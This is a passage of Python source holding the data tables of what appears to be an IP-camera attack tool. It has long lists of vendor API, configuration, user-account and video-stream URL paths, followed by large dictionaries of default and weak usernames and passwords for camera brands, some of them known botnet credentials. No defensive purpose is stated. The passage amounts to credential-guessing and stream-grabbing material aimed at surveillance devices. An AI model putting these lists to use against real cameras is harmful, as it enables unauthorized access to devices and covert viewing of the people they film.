    "/ISAPI/System/Video/inputs/channels/4",
    "/ISAPI/Streaming/channels/501",
    "/ISAPI/Streaming/channels/502",
    "/ISAPI/Streaming/channels/501/picture",
    "/ISAPI/Streaming/channels/502/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/5",
    "/ISAPI/System/Video/inputs/channels/5",
    "/ISAPI/Streaming/channels/601",
    "/ISAPI/Streaming/channels/602",
    "/ISAPI/Streaming/channels/601/picture",
    "/ISAPI/Streaming/channels/602/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/6",
    "/ISAPI/System/Video/inputs/channels/6",
    "/ISAPI/Streaming/channels/701",
    "/ISAPI/Streaming/channels/702",
    "/ISAPI/Streaming/channels/701/picture",
    "/ISAPI/Streaming/channels/702/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/7",
    "/ISAPI/System/Video/inputs/channels/7",
    "/ISAPI/Streaming/channels/801",
    "/ISAPI/Streaming/channels/802",
    "/ISAPI/Streaming/channels/801/picture",
    "/ISAPI/Streaming/channels/802/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/8",
    "/ISAPI/System/Video/inputs/channels/8",
    "/ISAPI/Streaming/channels/901",
    "/ISAPI/Streaming/channels/902",
    "/ISAPI/Streaming/channels/901/picture",
    "/ISAPI/Streaming/channels/902/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/9",
    "/ISAPI/System/Video/inputs/channels/9",
    "/ISAPI/Streaming/channels/1001",
    "/ISAPI/Streaming/channels/1002",
    "/ISAPI/Streaming/channels/1001/picture",
    "/ISAPI/Streaming/channels/1002/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/10",
    "/ISAPI/System/Video/inputs/channels/10",
    "/ISAPI/Streaming/channels/1101",
    "/ISAPI/Streaming/channels/1102",
    "/ISAPI/Streaming/channels/1101/picture",
    "/ISAPI/Streaming/channels/1102/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/11",
    "/ISAPI/System/Video/inputs/channels/11",
    "/ISAPI/Streaming/channels/1201",
    "/ISAPI/Streaming/channels/1202",
    "/ISAPI/Streaming/channels/1201/picture",
    "/ISAPI/Streaming/channels/1202/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/12",
    "/ISAPI/System/Video/inputs/channels/12",
    "/ISAPI/Streaming/channels/1301",
    "/ISAPI/Streaming/channels/1302",
    "/ISAPI/Streaming/channels/1301/picture",
    "/ISAPI/Streaming/channels/1302/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/13",
    "/ISAPI/System/Video/inputs/channels/13",
    "/ISAPI/Streaming/channels/1401",
    "/ISAPI/Streaming/channels/1402",
    "/ISAPI/Streaming/channels/1401/picture",
    "/ISAPI/Streaming/channels/1402/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/14",
    "/ISAPI/System/Video/inputs/channels/14",
    "/ISAPI/Streaming/channels/1501",
    "/ISAPI/Streaming/channels/1502",
    "/ISAPI/Streaming/channels/1501/picture",
    "/ISAPI/Streaming/channels/1502/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/15",
    "/ISAPI/System/Video/inputs/channels/15",
    "/ISAPI/Streaming/channels/1601",
    "/ISAPI/Streaming/channels/1602",
    "/ISAPI/Streaming/channels/1601/picture",
    "/ISAPI/Streaming/channels/1602/picture",
    "/ISAPI/ContentMgmt/InputProxy/channels/16",
    "/ISAPI/System/Video/inputs/channels/16",
    "/cgi-bin/configManager.cgi?action=getConfig&name=General",
    "/cgi-bin/configManager.cgi?action=getConfig&name=VideoInMode",
    "/cgi-bin/configManager.cgi?action=getConfig&name=VideoInOptions",
    "/cgi-bin/configManager.cgi?action=getConfig&name=VideoWidget",
    "/cgi-bin/configManager.cgi?action=getConfig&name=NTP",
    "/cgi-bin/configManager.cgi?action=getConfig&name=DDNS",
    "/cgi-bin/configManager.cgi?action=getConfig&name=UPnP",
    "/cgi-bin/configManager.cgi?action=getConfig&name=IPFilter",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Email",
    "/cgi-bin/configManager.cgi?action=getConfig&name=StorageGroup",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Record",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Snapshot",
    "/cgi-bin/configManager.cgi?action=getConfig&name=MotionDetect",
    "/cgi-bin/configManager.cgi?action=getConfig&name=BlindDetect",
    "/cgi-bin/configManager.cgi?action=getConfig&name=LossDetect",
    "/cgi-bin/configManager.cgi?action=getConfig&name=AlarmIn",
    "/cgi-bin/configManager.cgi?action=getConfig&name=AlarmOut",
    "/cgi-bin/configManager.cgi?action=getConfig&name=NetWork",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Ptz",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Comm",
    "/cgi-bin/configManager.cgi?action=getConfig&name=AutoMaintain",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Location",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Coaxial",
    "/cgi-bin/configManager.cgi?action=getConfig&name=SnapConfig",
    "/cgi-bin/configManager.cgi?action=getConfig&name=VideoAnalyseRule",
    "/cgi-bin/configManager.cgi?action=getConfig&name=TrafficSnapshot",
    "/cgi-bin/configManager.cgi?action=getConfig&name=AccessControl",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Encode",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Users",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Locales",
    "/cgi-bin/configManager.cgi?action=getConfig&name=TimeRule",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Holiday",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Dst",
    "/cgi-bin/configManager.cgi?action=getConfig&name=RTSP",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Multicast",
    "/cgi-bin/configManager.cgi?action=getConfig&name=FTP",
    "/cgi-bin/configManager.cgi?action=getConfig&name=SNMP",
    "/cgi-bin/configManager.cgi?action=getConfig&name=Bonjour",
    "/LAPI/V1.0/Channels/1/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/1/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/2/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/2/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/3/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/3/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/4/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/4/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/5/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/5/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/6/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/6/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/7/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/7/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/8/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/8/Media/Video/Streams/2",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=1",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=2",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=3",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=4",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=5",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=6",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=7",
    "/stw-cgi/video.cgi?msubmenu=stream&channel=8",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=0",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=1",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=2",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=3",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=4",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=5",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=6",
    "/cgi-bin/api.cgi?cmd=GetEnc&channel=7",
    "/axis-cgi/jpg/image.cgi?camera=1",
    "/axis-cgi/jpg/image.cgi?camera=2",
    "/axis-cgi/jpg/image.cgi?camera=3",
    "/axis-cgi/jpg/image.cgi?camera=4",
    "/axis-cgi/jpg/image.cgi?camera=5",
    "/axis-cgi/jpg/image.cgi?camera=6",
    "/axis-cgi/jpg/image.cgi?camera=7",
    "/axis-cgi/jpg/image.cgi?camera=8",
    "/ISAPI/System/time/ntpServers",
    "/ISAPI/System/Network/SIP",
    "/ISAPI/System/Network/SNMP",
    "/ISAPI/System/Network/FTP",
    "/ISAPI/System/Network/DDNS",
    "/ISAPI/System/Network/Mail",
    "/ISAPI/System/Network/HTTPS",
    "/ISAPI/System/Network/Qos",
    "/ISAPI/System/Network/802_1x",
    "/ISAPI/Security/Certificate",
    "/ISAPI/Security/deviceAccessList",
    "/ISAPI/SDCard/format",
    "/ISAPI/ContentMgmt/Storage",
    "/ISAPI/ContentMgmt/record/tracks",
    "/ISAPI/Image/channels/1/ircutFilter",
    "/ISAPI/Image/channels/1/display",
    "/ISAPI/Image/channels/1/color",
    "/ISAPI/PTZCtrl/channels/1/continuous",
    "/ISAPI/PTZCtrl/channels/1/presets",
    "/ISAPI/PTZCtrl/channels/1/patrols",
    "/ISAPI/PTZCtrl/channels/1/patterns",
    "/ISAPI/System/deviceInfo?locale=en_US",
    "/ISAPI/System/configurationData",
    "/ISAPI/System/capabilities?format=json",
    "/ISAPI/System/status?format=json",
    "/ISAPI/Security/users?format=json",
    "/ISAPI/Streaming/channels?format=json",
    "/ISAPI/System/Network/interfaces?format=json",
    "/ISAPI/Event/triggers",
    "/ISAPI/Event/schedules",
    "/ISAPI/Event/notification/httpHosts",
    "/ISAPI/Event/notification/FTP",
    "/ISAPI/Event/notification/email",
    "/ISAPI/Event/notification/alarmServer",
    "/ISAPI/System/IO/inputs/1",
    "/ISAPI/System/IO/outputs/1",
    "/ISAPI/Security/Challenge",
    "/ISAPI/Security/token",
    "/ISAPI/System/Serial/ports",
    "/ISAPI/System/deviceInfo/detail",
    "/ISAPI/System/TwoWayAudio/channels/1",
    "/ISAPI/System/Video/inputs/channels/1",
    "/ISAPI/System/Audio/inputs/channels/1",
    "/ISAPI/System/Network/dns",
    "/ISAPI/System/Network/pppoe",
    "/ISAPI/System/Network/wireless",
    "/ISAPI/System/Network/cellular",
    "/cgi-bin/magicBox.cgi?action=getSerialNo",
    "/cgi-bin/magicBox.cgi?action=getHardwareVersion",
    "/cgi-bin/magicBox.cgi?action=getBuildDate",
    "/cgi-bin/userManager.cgi?action=getUsers",
    "/cgi-bin/devVideoInput.cgi?action=getCaps",
    "/cgi-bin/ptz.cgi?action=start",
    "/cgi-bin/ptz.cgi?action=stop",
    "/RPC2_Alarm",
    "/RPC2_Storage",
    "/RPC2_Media",
    "/RPC2_Network",
    "/RPC2_System",
]

TOP_AUTH_PATHS = [
    "/", "/login", "/login.html", "/admin", "/doc/page/login.asp",
    "/ISAPI/System/deviceInfo", "/ISAPI/Security/userCheck", "/ISAPI/Streaming/channels/101/picture",
    "/cgi-bin/magicBox.cgi?action=getSystemInfo", "/RPC2", "/RPC2_Login",
    "/axis-cgi/param.cgi?action=list&group=root.Brand", "/axis-cgi/basicdeviceinfo.cgi",
    "/cgi-bin/CGIProxy.fcgi?cmd=getDevInfo", "/LAPI/V1.0/System/Device/Info",
    "/onvif/device_service", "/onvif-http/snapshot", "/device.rsp?opt=sys&cmd=get_device_info",
    "/stw-cgi/system.cgi?msubmenu=deviceinfo", "/cgi-bin/viewer/getparam.cgi?system_info",
]

TOP_STREAM_PATHS = [
    "/ISAPI/Streaming/channels/101/picture", "/ISAPI/Streaming/channels/1/picture",
    "/Streaming/Channels/101", "/Streaming/channels/101/picture",
    "/cgi-bin/snapshot.cgi", "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2",
    "/axis-cgi/jpg/image.cgi", "/onvif-http/snapshot", "/snapshot.jpg", "/snap.jpg",
    "/mjpg/video.mjpg", "/cam/realmonitor?channel=1&subtype=0",
    "/h264/ch1/main/av_stream", "/live/ch1", "/video.cgi",
]

STREAM_PATHS = [
    "/ISAPI/Streaming/channels/101/picture",
    "/ISAPI/Streaming/channels/1/picture",
    "/ISAPI/Streaming/channels/102/picture",
    "/ISAPI/Streaming/channels/201/picture",
    "/ISAPI/Streaming/channels/2/picture",
    "/ISAPI/Streaming/channels/301/picture",
    "/ISAPI/Streaming/channels/401/picture",
    "/Streaming/channels/101/picture",
    "/Streaming/Channels/101/picture",
    "/Streaming/channels/1/picture",
    "/Streaming/Channels/1/picture",
    "/Streaming/channels/102/picture",
    "/Streaming/Channels/102/picture",
    "/Streaming/channels/201/picture",
    "/PSIA/Streaming/channels/1/picture",
    "/PSIA/Streaming/channels/2/picture",
    "/PSIA/Streaming/channels/101/picture",
    "/PSIA/Streaming/channels/0/picture",
    "/onvif-http/snapshot",
    "/onvif/snapshot",
    "/onvif-http/snapshot?channel=1",
    "/snapshot.jpg", "/snap.jpg", "/image.jpg", "/image/jpeg.cgi",
    "/mjpg/video.mjpg", "/video.cgi",
    "/cgi-bin/snapshot.cgi", "/cgi-bin/mjpg/video.cgi", "/cgi-bin/video.mjpg",
    "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture",
    "/cgi-bin/CGIProxy.fcgi?cmd=snapPicture2",
    "/axis-cgi/jpg/image.cgi",
    "/axis-cgi/jpg/image.cgi?resolution=640x480",
    "/axis-cgi/jpg/image.cgi?resolution=1920x1080",
    "/axis-cgi/mjpg/video.cgi",
    "/axis-cgi/mjpg/video.cgi?resolution=640x480",
    "/axis-cgi/mjpg/video.cgi?fps=15",
    "/axis-media/media.amp",
    "/axis-media/media.amp?videocodec=h264",
    "/tmpfs/auto.jpg", "/tmpfs/snap.jpg",
    "/streaming/channels/1/preview",
    "/streaming/channels/101/preview",
    "/cam/realmonitor?channel=1&subtype=0",
    "/cam/realmonitor?channel=1&subtype=1",
    "/cgi-bin/net_jpeg.cgi?ch=1",
    "/cgi-bin/video.cgi?msubmenu=mjpg",
    "/cgi-bin/viewer/video.jpg",
    "/cgi-bin/viewer/video.mjpg",
    "/cgi-bin/viewer/live.cgi",
    "/oneshotimage.jpg", "/oneshotimage2.jpg",
    "/image?res=full", "/live/cam1", "/live/ch0", "/live/ch1",
    "/live/mjpeg", "/live.jpg", "/live.mjpg", "/mjpeg.cgi",
    "/mjpeg.mjpg", "/mjpg/1/video.mjpg", "/mjpg/video.cgi",
    "/videostream.cgi", "/videostream.asf", "/videostream.flv",
    "/snapshot", "/capture", "/jpg/image.jpg", "/jpeg",
    "/jpg/1/image.jpg", "/control/faststream.jpg",
    "/record/current.jpg", "/dyn/camera.m4", "/img/video.mjpeg",
    "/img/snapshot.cgi", "/web/cgi-bin/hi3510/snap.cgi",
    "/auto.jpg", "/webcam.jpg", "/video.h264", "/video.mp4",
    "/stream.mjpg", "/media/?action=stream", "/media/?action=snapshot",
    "/flv?port=1935&app=bcs&stream=channel0_main.bcs",
    "/cgi-bin/faststream.jpg", "/video.sdp", "/live.sdp",
    "/live/ch00_0", "/video1.mjpg", "/video2.mjpg",
    "/channel1", "/channel2", "/h264",
    "/h264/ch1/main/av_stream", "/h264/ch1/sub/av_stream",
    "/h265/ch1/main/av_stream", "/mpeg4/ch1/main/av_stream",
    "/media/video1", "/media/video2",
    "/live/ch1/mjpeg", "/live/ch2/mjpeg",
    "/Streaming/Channels/101",
    "/Streaming/Channels/102",
    "/ISAPI/Streaming/channels/101/preview",
    "/ISAPI/Streaming/channels/102/preview",
    "/live/ch1",
    "/live/ch1/mjpeg",
    "/h264/ch1/main",
    "/h264/ch1/sub",
    "/h265/ch1/main",
    "/h265/ch1/sub",
    "/Streaming/Channels/201",
    "/Streaming/Channels/202",
    "/ISAPI/Streaming/channels/201/preview",
    "/ISAPI/Streaming/channels/202/preview",
    "/live/ch2",
    "/live/ch2/mjpeg",
    "/h264/ch2/main",
    "/h264/ch2/sub",
    "/h265/ch2/main",
    "/h265/ch2/sub",
    "/Streaming/Channels/301",
    "/Streaming/Channels/302",
    "/ISAPI/Streaming/channels/301/preview",
    "/ISAPI/Streaming/channels/302/preview",
    "/live/ch3",
    "/live/ch3/mjpeg",
    "/h264/ch3/main",
    "/h264/ch3/sub",
    "/h265/ch3/main",
    "/h265/ch3/sub",
    "/Streaming/Channels/401",
    "/Streaming/Channels/402",
    "/ISAPI/Streaming/channels/401/preview",
    "/ISAPI/Streaming/channels/402/preview",
    "/live/ch4",
    "/live/ch4/mjpeg",
    "/h264/ch4/main",
    "/h264/ch4/sub",
    "/h265/ch4/main",
    "/h265/ch4/sub",
    "/Streaming/Channels/501",
    "/Streaming/Channels/502",
    "/ISAPI/Streaming/channels/501/preview",
    "/ISAPI/Streaming/channels/502/preview",
    "/live/ch5",
    "/live/ch5/mjpeg",
    "/h264/ch5/main",
    "/h264/ch5/sub",
    "/h265/ch5/main",
    "/h265/ch5/sub",
    "/Streaming/Channels/601",
    "/Streaming/Channels/602",
    "/ISAPI/Streaming/channels/601/preview",
    "/ISAPI/Streaming/channels/602/preview",
    "/live/ch6",
    "/live/ch6/mjpeg",
    "/h264/ch6/main",
    "/h264/ch6/sub",
    "/h265/ch6/main",
    "/h265/ch6/sub",
    "/Streaming/Channels/701",
    "/Streaming/Channels/702",
    "/ISAPI/Streaming/channels/701/preview",
    "/ISAPI/Streaming/channels/702/preview",
    "/live/ch7",
    "/live/ch7/mjpeg",
    "/h264/ch7/main",
    "/h264/ch7/sub",
    "/h265/ch7/main",
    "/h265/ch7/sub",
    "/Streaming/Channels/801",
    "/Streaming/Channels/802",
    "/ISAPI/Streaming/channels/801/preview",
    "/ISAPI/Streaming/channels/802/preview",
    "/live/ch8",
    "/live/ch8/mjpeg",
    "/h264/ch8/main",
    "/h264/ch8/sub",
    "/h265/ch8/main",
    "/h265/ch8/sub",
    "/Streaming/Channels/901",
    "/Streaming/Channels/902",
    "/ISAPI/Streaming/channels/901/preview",
    "/ISAPI/Streaming/channels/902/preview",
    "/live/ch9",
    "/live/ch9/mjpeg",
    "/h264/ch9/main",
    "/h264/ch9/sub",
    "/h265/ch9/main",
    "/h265/ch9/sub",
    "/Streaming/Channels/1001",
    "/Streaming/Channels/1002",
    "/ISAPI/Streaming/channels/1001/preview",
    "/ISAPI/Streaming/channels/1002/preview",
    "/live/ch10",
    "/live/ch10/mjpeg",
    "/h264/ch10/main",
    "/h264/ch10/sub",
    "/h265/ch10/main",
    "/h265/ch10/sub",
    "/Streaming/Channels/1101",
    "/Streaming/Channels/1102",
    "/ISAPI/Streaming/channels/1101/preview",
    "/ISAPI/Streaming/channels/1102/preview",
    "/live/ch11",
    "/live/ch11/mjpeg",
    "/h264/ch11/main",
    "/h264/ch11/sub",
    "/h265/ch11/main",
    "/h265/ch11/sub",
    "/Streaming/Channels/1201",
    "/Streaming/Channels/1202",
    "/ISAPI/Streaming/channels/1201/preview",
    "/ISAPI/Streaming/channels/1202/preview",
    "/live/ch12",
    "/live/ch12/mjpeg",
    "/h264/ch12/main",
    "/h264/ch12/sub",
    "/h265/ch12/main",
    "/h265/ch12/sub",
    "/Streaming/Channels/1301",
    "/Streaming/Channels/1302",
    "/ISAPI/Streaming/channels/1301/preview",
    "/ISAPI/Streaming/channels/1302/preview",
    "/live/ch13",
    "/live/ch13/mjpeg",
    "/h264/ch13/main",
    "/h264/ch13/sub",
    "/h265/ch13/main",
    "/h265/ch13/sub",
    "/Streaming/Channels/1401",
    "/Streaming/Channels/1402",
    "/ISAPI/Streaming/channels/1401/preview",
    "/ISAPI/Streaming/channels/1402/preview",
    "/live/ch14",
    "/live/ch14/mjpeg",
    "/h264/ch14/main",
    "/h264/ch14/sub",
    "/h265/ch14/main",
    "/h265/ch14/sub",
    "/Streaming/Channels/1501",
    "/Streaming/Channels/1502",
    "/ISAPI/Streaming/channels/1501/preview",
    "/ISAPI/Streaming/channels/1502/preview",
    "/live/ch15",
    "/live/ch15/mjpeg",
    "/h264/ch15/main",
    "/h264/ch15/sub",
    "/h265/ch15/main",
    "/h265/ch15/sub",
    "/Streaming/Channels/1601",
    "/Streaming/Channels/1602",
    "/ISAPI/Streaming/channels/1601/preview",
    "/ISAPI/Streaming/channels/1602/preview",
    "/live/ch16",
    "/live/ch16/mjpeg",
    "/h264/ch16/main",
    "/h264/ch16/sub",
    "/h265/ch16/main",
    "/h265/ch16/sub",
    "/webrtc/stream",
    "/webrtc/live",
    "/whep/channel1",
    "/whip/channel1",
    "/hls/live.m3u8",
    "/hls/stream.m3u8",
    "/hls/channel1.m3u8",
    "/hls/channel2.m3u8",
    "/hls/ch1/main.m3u8",
    "/hls/ch1/sub.m3u8",
    "/dash/live.mpd",
    "/dash/stream.mpd",
    "/dash/channel1.mpd",
    "/flv?app=live&stream=stream1",
    "/flv?app=live&stream=stream2",
    "/live.flv",
    "/stream.flv",
    "/video.flv",
    "/ws/stream",
    "/websocket/stream",
    "/camera/stream",
    "/media/stream",
    "/snap.cgi",
    "/snapshot.cgi?channel=1",
    "/snapshot.cgi?channel=2",
    "/cgi-bin/snapshot.cgi?channel=1",
    "/cgi-bin/snapshot.cgi?channel=2",
    "/cgi-bin/net_jpeg.cgi?ch=2",
    "/cgi-bin/net_jpeg.cgi?ch=3",
    "/cgi-bin/viewer/video.jpg?resolution=1920x1080",
    "/cgi-bin/viewer/video.jpg?resolution=1280x720",
    "/stw-cgi/video.cgi?msubmenu=stream&action=view",
    "/cgi-bin/api.cgi?cmd=Snap&channel=0",
    "/cgi-bin/api.cgi?cmd=Snap&channel=1",
    "/LAPI/V1.0/Channels/1/Media/Video/Streams/2",
    "/LAPI/V1.0/Channels/2/Media/Video/Streams/1",
    "/LAPI/V1.0/Channels/2/Media/Video/Streams/2",
    "/rcp.xml?message=0x0824&type=P_OCTET",
    "/dyn/camera.m4?channel=1",
    "/dyn/camera.m4?channel=2",
    "/oneshotimage.jpg?res=high",
    "/oneshotimage.jpg?res=low",
    "/pelco-bin/cam.cgi?channel=1",
    "/pelco-bin/cam.cgi?channel=2",
    "/cgi-bin/get_params.cgi?snap=1",
    "/live/cam2",
    "/live/cam3",
    "/live/cam4",
    "/live.mjpg?channel=1",
    "/live.mjpg?channel=2",
    "/video1.mjpg",
    "/video2.mjpg",
    "/video3.mjpg",
    "/channel1.mjpg",
    "/channel2.mjpg",
    "/channel3.mjpg",
    "/h264/ch2/main/av_stream",
    "/h264/ch3/main/av_stream",
    "/h264/ch4/main/av_stream",
    "/h265/ch2/main/av_stream",
    "/h265/ch3/main/av_stream",
    "/h265/ch4/main/av_stream",
    "/mpeg4/ch2/main/av_stream",
    "/mpeg4/ch3/main/av_stream",
    "/media/video3",
    "/media/video4",
    "/live/ch3/mjpeg",
    "/live/ch4/mjpeg",
]

TOP_CREDS: Dict[str, List[str]] = {
    "admin": [
        "admin", "12345", "123456", "1234", "password", "12345678",
        "admin123", "888888", "1111", "0000", "Hik12345", "pass",
        "666666", "999999", "admin@123", "Admin123", "camera",
        "123", "111111", "000000", "admin1234", "4321",
    ],
    "root": [
        "root", "toor", "12345", "pass", "admin", "password", "vizxv",
        "xmhdipc", "1234", "7ujMko0vizxv", "root123", "default",
    ],
    "user": ["user", "12345", "password", "user123", "guest", "1234"],
    "guest": ["guest", "12345", "guest123", "", "password"],
    "operator": ["operator", "12345", "operator123", "admin"],
    "service": ["service", "12345", "service123"],
    "support": ["support", "12345", "support123"],
    "supervisor": ["supervisor", "12345", "supervisor123"],
    "installer": ["installer", "12345", "installer123"],
    "default": ["default", "", "12345"],
}

CREDS: Dict[str, List[str]] = {
    "admin": [
        "admin", "12345", "123456", "1234", "password", "12345678",
        "admin123", "888888", "1111", "0000", "hikvision", "Hik12345",
        "7ujMko0admin", "7ujMko0vizxv", "pass", "root", "Admin1234",
        "666666", "999999", "1qaz2wsx", "abc123", "admin@123",
        "Admin123", "camera", "ipcam", "123", "111111", "000000",
        "admin1234", "4321", "adminadmin", "112233", "abcdef",
        "meinsm", "tl-ipc", "juantech", "xmhdipc", "klv1234", "anko",
        "GM8182", "jvbzd", "hunt5759", "fliradmin", "vivotek", "foscam",
        "amcrest", "reolink", "system", "Hik12345+", "Dahua123",
        "Dahua1234", "Uniview123", "Provision123", "Tiandy123",
        "CPPlus123", "TVT12345", "Sony1234", "Bosch1234", "Pelco1234",
        "Axis1234", "Mobotix123", "Wansview123", "Sricam123",
        "Escam123", "Xiaomi123", "Ezviz123", "Imou1234", "Jovision123",
        "admin12345", "admin888", "admin999", "admin_123", "admin@2020",
        "admin@2021", "admin@2022", "admin@2023", "admin@2024", "admin@2025",
        "admin!@#", "admin#123", "Admin@1234", "Admin@12345", "pass1234",
        "camera123", "cctv1234", "cctv2020", "cctv2024", "security123",
        "service123", "support123", "system123", "tech1234", "welcome1",
    ],
    "root": [
        "root", "toor", "12345", "pass", "admin", "password", "vizxv",
        "xmhdipc", "juantech", "klv1234", "klv123", "anko", "system",
        "GM8182", "jvbzd", "1234", "7ujMko0vizxv", "hunt5759",
        "root123", "camera", "hi3518", "hi3516", "cat1029", "default",
        "root1234", "root@123", "root@2024", "rootadmin", "toor123",
        "123456", "12345678", "rootpassword", "rootpass", "toorpass",
    ],
    "user": [
        "user", "12345", "password", "user123", "guest", "1234", "user1",
        "user1234", "user@123", "user2024", "123456", "useruser",
    ],
    "guest": [
        "guest", "12345", "guest123", "", "password", "guest1",
        "guest1234", "guest@123", "guest2024", "123456", "guestguest",
    ],
    "operator": [
        "operator", "12345", "operator123", "admin", "operator1234",
        "operator@123", "operator2024", "123456", "oper", "op123",
    ],
    "service": [
        "service", "12345", "service123", "service2020", "service2024",
        "service@123", "123456", "service1234", "serv",
    ],
    "support": [
        "support", "12345", "support123", "tsc1234", "support2024",
        "support@123", "123456", "supp123",
    ],
    "supervisor": [
        "supervisor", "supervisor123", "1234", "12345", "supervisor2024",
        "super", "super123", "123456",
    ],
    "manager": [
        "manager", "12345", "password", "manager123", "manager2024",
        "manage", "manage123", "123456",
    ],
    "installer": [
        "installer", "12345", "installer123", "install", "installer2024",
        "123456", "install123",
    ],
    "technician": [
        "technician", "12345", "tech123", "tech1234", "tech2024",
        "technician123", "123456",
    ],
    "camera": [
        "camera", "12345", "camera123", "camera2024", "cam123", "123456",
    ],
    "view": ["view", "12345", "view123", "viewer", "viewer123"],
    "live": ["live", "live123", "12345", "live2024", "123456"],
    "cctv": ["cctv", "cctv123", "12345", "cctv2024", "cctv1234", "123456"],
    "dvc": ["dvc", "dvc123", "12345", "123456"],
    "iview": ["iview", "iview123", "12345", "123456"],
    "ubnt": ["ubnt", "ubnt123", "ubnt2024", "12345"],
    "pi": ["raspberry", "raspberry123", "pi", "admin", "12345"],
    "default": ["default", "", "12345", "default123"],
    "security": ["security", "security123", "12345", "security2024"],
    "hikvision": ["hikvision", "12345", "Hik12345", "Hik12345+"],
    "dahua": ["dahua", "12345", "Dahua123", "Dahua1234"],
    "axis": ["axis", "12345", "Axis1234", "root"],
    "hanwha": ["hanwha", "12345", "Hanwha123", "4321"],
    "uniview": ["uniview", "12345", "Uniview123", "123456"],
    "bosch": ["bosch", "12345", "Bosch1234", "root"],
    "sony": ["sony", "12345", "Sony1234", "admin"],
    "pelco": ["pelco", "12345", "Pelco1234", "admin"],
    "panasonic": ["panasonic", "12345", "Panasonic123", "admin"],
    "vivotek": ["vivotek", "12345", "vivotek", "admin"],
    "foscam": ["foscam", "12345", "foscam", ""],
    "amcrest": ["amcrest", "12345", "amcrest", "admin"],
    "reolink": ["reolink", "12345", "reolink", ""],
    "tiandy": ["tiandy", "12345", "Tiandy123", "admin"],
    "tvt": ["tvt", "12345", "TVT12345", "123456"],
    "geovision": ["geovision", "12345", "Geo12345", "admin"],
    "mobotix": ["mobotix", "12345", "meinsm", "admin"],
    "arecont": ["arecont", "12345", "Arecont123", "admin"],
    "basler": ["basler", "12345", "Basler123", "admin"],
    "cpplus": ["cpplus", "12345", "CPPlus123", "admin"],
    "provision": ["provision", "12345", "Provision123", "123456"],
    "lilin": ["lilin", "12345", "Lilin123", "pass"],
    "xiongmai": ["xiongmai", "12345", "xmhdipc", ""],
    "tplink": ["tplink", "12345", "admin", "tl-ipc"],
    "ezviz": ["ezviz", "12345", "Ezviz123", "admin"],
    "imou": ["imou", "12345", "Imou1234", "admin"],
    "xiaomi": ["xiaomi", "12345", "Xiaomi123", "admin"],
    "jovision": ["jovision", "12345", "Jovision123", "admin"],
    "wansview": ["wansview", "12345", "Wansview123", "123456"],
    "sricam": ["sricam", "12345", "Sricam123", "admin"],
    "escam": ["escam", "12345", "Escam123", "admin"],
    "netman": ["netman", "netman123", "12345"],
    "admin1": ["admin1", "12345", "admin"],
    "root1": ["root1", "12345", "root"],
    "stream": ["stream", "stream123", "12345"],
    "test": ["test", "test123", "12345"],
    "master": ["master", "master123", "12345"],
    "666666": ["666666", "12345"],
    "888888": ["888888", "12345"],
    "admin2": ["admin2", "12345", "admin", "123456"],
    "user2": ["user2", "12345", "user", "123456"],
    "operator2": ["operator2", "12345", "operator", "123456"],
    "viewer2": ["viewer2", "12345", "viewer", "123456"],
    "guest2": ["guest2", "12345", "guest", "123456"],
    "service2": ["service2", "12345", "service", "123456"],
    "tech2": ["tech2", "12345", "tech", "123456"],
    "support2": ["support2", "12345", "support", "123456"],
    "manager2": ["manager2", "12345", "manager", "123456"],
    "supervisor2": ["supervisor2", "12345", "supervisor", "123456"],
    "installer2": ["installer2", "12345", "installer", "123456"],
    "security2": ["security2", "12345", "security", "123456"],
    "monitor": ["monitor", "12345", "monitor123", "123456", "admin"],
    "display": ["display", "12345", "display123", "123456", "admin"],
    "client": ["client", "12345", "client123", "123456", "admin"],
    "remote": ["remote", "12345", "remote123", "123456", "admin"],
